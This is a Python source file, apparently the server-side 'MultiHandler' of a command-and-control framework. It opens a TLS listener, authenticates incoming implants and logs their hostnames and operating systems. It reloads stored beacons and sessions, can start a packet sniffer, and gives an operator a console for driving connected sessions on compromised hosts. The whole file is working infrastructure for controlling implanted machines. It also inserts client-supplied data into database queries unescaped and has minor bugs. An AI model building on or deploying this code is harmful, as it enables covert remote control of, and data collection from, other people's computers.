import socket
import ssl
import threading
import os
import sys
import secrets
import traceback
import colorama
import readline
import json
import ast
import uuid

from datetime import datetime, time
from ..utils.authentication import Authentication
from .multi_handler_commands import MultiHandlerCommands
from PacketSniffing.PacketSniffer import PacketSniffer
from ServerDatabase.database import DatabaseClass, command_database
from Modules.multiplayer.multiplayer import MultiPlayer

from ..session.session import add_connection_list
from ..beacon.beacon import add_beacon_list
from ..session.transfer import receive_data, send_data
from ..global_objects import (
    sessions_list,
    beacon_list,
    execute_local_commands,
    config,
    tab_completion,
    logger,
    obfuscation_map,
)
from Modules.utils.config_configuration import config_menu, beacon_config_menu
from Modules.utils.console import cprint, warn, error as c_error


class MultiHandler:
    """
    This class manages multiple sessions and beacons,
    providing a command interface for user interaction.
    Args:
        None
    Returns:
        None
    """


    def __init__(self) -> None:
        logger.info("Starting MultiHandler")
        self.multihandlercommands = MultiHandlerCommands(config)
        self.Authentication = Authentication()
        self.database = DatabaseClass(config, "command_database")
        command_database = self.database
        self.create_certificate()
        self.create_hmac()
        self.load_db_implants()
        colorama.init(autoreset=True)
        if config['packetsniffer']['active']:
            sniffer = PacketSniffer()
            sniffer.start_raw_socket()
            logger.info("PacketSniffer started")

        self.isMultiplayer = False
        try:
            if config['multiplayer']['multiplayerEnabled']:
                self.isMultiplayer = True
                self.multiplayer = MultiPlayer(config)
                self.multihandlercommands = MultiHandlerCommands(config)
                cprint("Multiplayer mode enabled", fg="green")
                logger.info("Server: Multiplayer mode enabled")
                threading.Thread(target=self.multiplayer.start(),
                args=(config,),
                daemon=True
            ).start()
        except KeyError as e:
            warn("Multiplayer configuration not found, continuing in singleplayer mode")
            traceback.print_exc()
            warn(e)
            logger.info("Server: Continuing in singleplayer mode")

    def load_db_implants(self):
        """
        Loads implants from the database into the obfuscation map.
        Args:
            None
        Returns:
            None
        """
        logger.info("Loading implants from database")
        try:
            # Load Beacons
            # Schema: uuid text, IP text, Hostname text, OS text, LastBeacon text, NextBeacon text, Timer real, Jitter real, modules list
            beacons = self.database.fetch_all("beacons")
            if beacons:
                for beacon in beacons:
                    try:
                        uuid_val = beacon[0]
                        ip = beacon[1]
                        hostname = beacon[2]
                        os_val = beacon[3]
                        # last_beacon stored as text in DB? Beacon expects float.
                        try:
                            last_beacon = beacon[4]
                        except (ValueError, TypeError):
                            last_beacon = float(beacon[4]) if beacon[4] else 0.0
                        timer = float(beacon[6]) if beacon[6] else 0.0
                        jitter = float(beacon[7]) if beacon[7] else 0.0
                        
                        modules_data = beacon[8]
                        if isinstance(modules_data, str):
                            try:
                                modules = ast.literal_eval(modules_data)
                            except (ValueError, SyntaxError):
                                modules = []
                        else:
                            modules = modules_data if isinstance(modules_data, list) else []
                        add_beacon_list(
                            uuid_val, 
                            ip, 
                            hostname, 
                            os_val, 
                            last_beacon, 
                            timer, 
                            jitter, 
                            config, 
                            self.database,
                            modules,
                            from_db=True
                        )
                    except Exception as e:
                        logger.error(f"Error loading beacon {beacon}: {e}")
                        continue

            # Load Sessions
            # Schema: address text, details text, hostname text, operating_system text, mode text, modules list
            sessions = self.database.fetch_all("sessions")
            if sessions:
                for session in sessions:
                    try:
                        address_data = session[0]
                        if isinstance(address_data, str):
                            try:
                                address = ast.literal_eval(address_data)
                            except (ValueError, SyntaxError):
                                address = (address_data, 0)
                        else:
                            address = address_data

                        details = session[1]
                        hostname = session[2]
                        operating_system = session[3]
                        mode = session[4]
                        
                        modules_data = session[5]
                        if isinstance(modules_data, str):
                            try:
                                modules = ast.literal_eval(modules_data)
                            except (ValueError, SyntaxError):
                                modules = []
                        else:
                            modules = modules_data if isinstance(modules_data, list) else []

                        user_id = str(uuid.uuid4())
                        
                        add_connection_list(
                            details, 
                            address, 
                            hostname, 
                            operating_system, 
                            user_id, 
                            mode, 
                            modules, 
                            config,
                            from_db=True
                        )
                    except Exception as e:
                         logger.error(f"Error loading session {session}: {e}")
                         continue

        except Exception as e:
            logger.error(f"Failed to load implants from DB: {e}")
            
    def create_hmac(self):
        """
        Checks if an HMAC key is created in the location
        defined in config.
        If it doesn't exist, a new HMAC key is generated and saved.
        Args:
            None
        Returns:
            None
        """
        logger.info("Checking for HMAC key")
        cert_dir = os.path.expanduser(config['server']['TLSCertificateDir'])
        hmac_key_path = os.path.join(cert_dir, "hmac.key")
        logger.debug(f"HMAC key path: {hmac_key_path}")

        if not os.path.isfile(hmac_key_path):
            logger.info("HMAC key not found, creating new one")
            if not os.path.isdir(cert_dir):
                logger.debug(f"Creating directory for HMAC key: {cert_dir}")
            # generate a 32-byte (64 hex chars) key using Python's secrets module and write it to file
            try:
                key = secrets.token_hex(32)
                with open(hmac_key_path, "w") as f:
                    f.write(key)
                # try to make the file readable only by the owner
                try:
                    os.chmod(hmac_key_path, 0o600)
                except Exception:
                    logger.debug("Could not change permissions on HMAC key file")
            except Exception as e:
                logger.error(f"Failed to create HMAC key: {e}")
            logger.info("HMAC key created successfully")
            cprint("HMAC key created: " + f"{hmac_key_path}", fg="green")

    def create_certificate(self) -> None:
        """
        Checks if TLS certificates are created in the location
        defined in config.
        If they don't exist, new TLS certificates are generated and saved.
        Args:
            None
        Returns:
            None
        """
        logger.info("Checking for TLS certificates")
        cert_dir = os.path.expanduser(config['server']['TLSCertificateDir'])
        tls_key =  os.path.expanduser(config['server']['TLSkey'])
        tls_cert = os.path.expanduser(config['server']['TLSCertificate'])

        key_path = os.path.join(cert_dir, tls_key)
        cert_path = os.path.join(cert_dir, tls_cert)
        logger.debug(f"Key path: {key_path}, Cert path: {cert_path}")

        if not os.path.isfile(key_path) and not os.path.isfile(cert_path):
            logger.info("TLS certificates not found, creating new ones")
            if not os.path.isdir(cert_dir):
                logger.debug(f"Creating directory for TLS certificates: {cert_dir}")
                os.mkdir(cert_dir)
            os.system(
                "openssl req -x509 -newkey rsa:2048 -nodes -keyout " +
                f"{key_path} -days 365 -out {cert_path} -subj " +
                "'/CN=localhost'"
            )
            logger.info("TLS certificates created successfully")
            cprint("TLS certificates created: " + f"{cert_dir}{tls_key} and {cert_dir}{tls_cert}", fg="green")

    def startsocket(self) -> None:
        """
        Starts the SSL socket server, binds to the configured address and port,
        and begins listening for incoming connections.
        Args:
            None
        Returns:
            None
        """
        try:
            logger.info("Starting socket server")
            global SSL_Socket, socket_clear
            self.address = (config['server']['listenaddress'],
                            config['server']['port'])
            logger.debug(f"Socket address: {self.address}")
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            logger.debug("Creating SSL context")
            cert_dir = os.path.expanduser(config['server']['TLSCertificateDir'])
            tls_key = config['server']['TLSkey']
            tls_cert = config['server']['TLSCertificate']
            logger.debug(f"Certificate directory: {cert_dir}, Key: {tls_key}, Cert: {tls_cert}")
            context.load_cert_chain(
                certfile=os.path.join(cert_dir, tls_cert),
                keyfile=os.path.join(cert_dir, tls_key))
            logger.debug("SSL context loaded with certificate and key")
            socket_clear = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            socket_clear.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            logger.debug("Creating clear socket")
            SSL_Socket = context.wrap_socket(socket_clear, server_side=True)
            logger.debug("Wrapping socket with SSL context")
        except FileNotFoundError:
            logger.error("TLS certificate or key file not found")
            c_error("TLS certificate or key file not found.")
            sys.exit(1)
        except ssl.SSLError as e:
            logger.critical(f"SSL error: {e}")
            c_error("SSL error: " + str(e))
            sys.exit(1)
        except Exception as e:
            logger.critical(f"Unexpected error: {e}")
            c_error("Unexpected error: " + str(e))
            sys.exit(1)
        try:
            SSL_Socket.bind(self.address)
            logger.info(f"Socket bound to {self.address[0]}:{self.address[1]}")
        except OSError:  # error incase socket is already being used
            logger.error(f"Socket {self.address[0]}:{self.address[1]} already in use")
            c_error(f"{self.address[0]}:{self.address[1]} already in use")
            logger.critical("Exiting due to socket error")
            sys.exit(1)
        SSL_Socket.listen()
        logger.info(f"Socket listening on {self.address[0]}:{self.address[1]}")
        listenerthread = threading.Thread(
            target=self.accept_connection,
            args=())
        logger.debug("Starting listener thread for accepting connections")
        listenerthread.daemon = True
        listenerthread.start()
        return

    def accept_connection(self) -> None:
        """
        Accepts incoming connections and handles authentication.
        Args:
            None
        Returns:
            None
        """
        threadDB = DatabaseClass(config, "command_database")
        logger.info("Accepting connections on socket")
        while True:
            conn, r_address = SSL_Socket.accept()
            logger.info(f"Connection accepted from {r_address[0]}:{r_address[1]}")
            send_data(conn, self.Authentication.get_authentication_string())
            logger.debug("Sent authentication string to client")
            if (self.Authentication.test_auth(
                    receive_data(conn))):
                logger.info(f"Authentication successful for {r_address[0]}:{r_address[1]}")
                data = receive_data(conn)
                logger.debug(f"Received data from client: {data}")
                try:
                    data_json = json.loads(data)
                    hostname = data_json.get("Hostname")
                    os = data_json.get("OS")
                    id = data_json.get("ID")
                except (json.JSONDecodeError, AttributeError) as e:
                    logger.error(f"Failed to decode JSON data: {e}")
                    os = None
                    id = None
                logger.debug(f"Received hostname from client: {hostname}")
                send_data(conn, str(config['packetsniffer']['active']))
                logger.debug(f"OS: {os}, ID: {id}")
                if config['packetsniffer']['active']:
                    # send port number
                    send_data(conn, str(config['packetsniffer']['port']))
                    logger.debug("Sent packet sniffer port to client")
                add_connection_list(conn, r_address, hostname,
                                    os, id, "session", [], config)
                logger.info(f"Added connection to sessions list: {hostname} ({os})")
                threadDB.insert_entry(
                    "Addresses",
                    f'"{r_address[0]}", "{r_address[1]}", "{hostname}", ' +
                    f'"{data[0]}", ' +
                    f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
            else:
                conn.close()

    def multi_handler(self, config: dict) -> None:
        """
        Starts the MultiHandler command interface,
        allowing user interaction with connected sessions and beacons.
        Args:
            config (dict): Configuration object for database and settings
        Returns:
            None
        """
        logger.info("Starting MultiHandler menu")
        
        try:
            cprint(f"Awaiting connection on port {self.address[0]}:{self.address[1]}", fg="yellow")
            if config['packetsniffer']['active']:
                cprint("PacketSniffing active on port " + str(config['packetsniffer']['port']), fg="green")
                logger.info("PacketSniffing is active")
            while True:
                readline.parse_and_bind("tab: complete")
                readline.set_completer(
                    lambda text, state:
                        tab_completion(text,
                                       state, ["list", "sessions", "beacons",
                                               "close", "closeall", "users" if self.isMultiplayer else None,
                                               "configbeacon",
                                               "command", "hashfiles",
                                               "config", "configBeacon", "logs", "help", "exit",]))
                command = input("MultiHandler: ").lower()
                logger.debug(f"Received command: {command}")
                if command == "exit":  # closes the server down
                    c_error("Closing connections")
                    break  # exits the multihandler

                def handle_sessions():
                    logger.debug("Handling sessions command")
                    if len(sessions_list) == 0:
                        c_error("No sessions connected")
                    else:
                        self.multihandlercommands.sessionconnect()

                def handle_beacons():
                    logger.debug("Handling beacons command")
                    if len(beacon_list) == 0:
                        c_error("No beacons connected")
                        logger.warning("No beacons connected")
                    elif len(beacon_list) > 1:
                        try:
                            index = int(input("Enter the index of the beacon: "))
                        except ValueError:
                            c_error("Invalid index input")
                            logger.error("Invalid index input for beacon selection")
                            return
                        logger.debug(f"Selected beacon index: {index}")
                        try:
                            beacon = list(beacon_list.values())[index]
                            self.multihandlercommands.use_beacon(
                                beacon.uuid,
                                beacon.address
                            )
                            logger.info(f"Using beacon {beacon.uuid} at {beacon.address}")

                        except IndexError:
                            c_error("Index out of range")
                            logger.error("Index out of range for beacon selection")
                    else:
                        beacon = list(beacon_list.values())[0]
                        self.multihandlercommands.use_beacon(
                            beacon.uuid,
                            beacon.address
                        )

                command_handlers = {
                    "list": self.multihandlercommands.listconnections,
                    "sessions": handle_sessions,
                    "beacons": handle_beacons,
                    "close": lambda:
                        self.multihandlercommands.close_from_multihandler(),
                    "closeall": lambda:
                        self.multihandlercommands.close_all_connections(),
                    "hashfiles": self.multihandlercommands.localDatabaseHash,
                    "config": config_menu,
                    "configBeacon": beacon_config_menu,
                    "users": self.multiplayer.userMenu if self.isMultiplayer else (lambda: c_error("Multiplayer mode is not enabled")),
                    "logs": self.multihandlercommands.view_logs,
                }

                try:
                    logger.debug(f"Executing command: {command}")
                    handler = command_handlers.get(command)
                    if handler:
                        handler()
                    else:
                        logger.error(f"Unknown command: {command}")
                        if not execute_local_commands(command):
                            print(config['MultiHandlerCommands']['help'])
                except (KeyError, SyntaxError, AttributeError) as e:
                    logger.error(f"Error executing command: {e}")
                    print(e)
                    traceback.print_exc()

        except KeyboardInterrupt:
            logger.warning("KeyboardInterrupt received, exiting MultiHandler")
            c_error("\nUse exit next time")
        return
